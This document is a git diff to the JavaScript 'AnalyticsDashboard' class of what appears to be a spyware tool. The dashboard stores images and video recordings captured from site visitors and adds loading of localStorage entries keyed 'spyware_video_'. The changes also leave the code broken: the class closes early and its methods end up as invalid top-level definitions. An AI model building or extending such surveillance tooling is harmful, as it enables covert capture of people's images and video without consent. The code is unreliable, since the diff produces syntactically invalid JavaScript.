@@ -125,13 +125,15 @@ class AnalyticsDashboard {
         // Add to live feed
         this.addToLiveFeed(data);
 
-        // Handle captured images
-        if (data.capturedImage) {
+        // Handle captured images (both old and new format)
+        if (data.capturedImage || data.type === 'CAPTURED_IMAGE') {
+            const imageData = data.capturedImage || data;
             this.capturedImages.push({
-                ...data.capturedImage,
+                ...imageData,
                 visitorId,
                 timestamp: new Date().toISOString()
             });
+            console.log('Captured image added to dashboard:', imageData.timestamp);
         }
 
         // Handle video recordings
@@ -497,38 +499,50 @@ class AnalyticsDashboard {
         if (stored) {
             try {
                 const data = JSON.parse(stored);
-                this.visitors = new Map(data.visitors || []);
+                this.visitors = data.visitors || [];
                 this.capturedImages = data.capturedImages || [];
-                this.liveFeed = data.liveFeed || [];
-                this.stats = data.stats || this.stats;
                 this.videoRecordings = data.videoRecordings || [];
                 this.statsDocuments = data.statsDocuments || [];
-                this.updateUI();
+                this.updateDashboard();
             } catch (e) {
-                console.error('Failed to load stored data:', e);
+                console.error('Error loading stored data:', e);
+            }
+        }
+        
+        // Load separate video files from localStorage
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            if (key && key.startsWith('spyware_video_')) {
+                try {
+                    const videoData = JSON.parse(localStorage.getItem(key));
+                    this.handleVideoRecording(videoData);
+                    console.log('Loaded video from separate storage:', key);
+                } catch (error) {
+                    console.error('Error loading video data:', error);
+                }
             }
         }
     }
+}
 
-    getDeviceInfo() {
-        const ua = navigator.userAgent;
-        let browser = 'Unknown';
-        
-        if (ua.includes('Chrome')) browser = 'Chrome';
-        else if (ua.includes('Firefox')) browser = 'Firefox';
-        else if (ua.includes('Safari')) browser = 'Safari';
-        else if (ua.includes('Edge')) browser = 'Edge';
-        
-        return {
-            browser,
-            os: navigator.platform,
-            mobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)
-        };
-    }
+getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let browser = 'Unknown';
+    
+    if (ua.includes('Chrome')) browser = 'Chrome';
+    else if (ua.includes('Firefox')) browser = 'Firefox';
+    else if (ua.includes('Safari')) browser = 'Safari';
+    else if (ua.includes('Edge')) browser = 'Edge';
+    
+    return {
+        browser,
+        os: navigator.platform,
+        mobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)
+    };
+}
 
-    generateSessionId() {
-        return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
-    }
+generateSessionId() {
+    return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
 }
 
 // Initialize dashboard
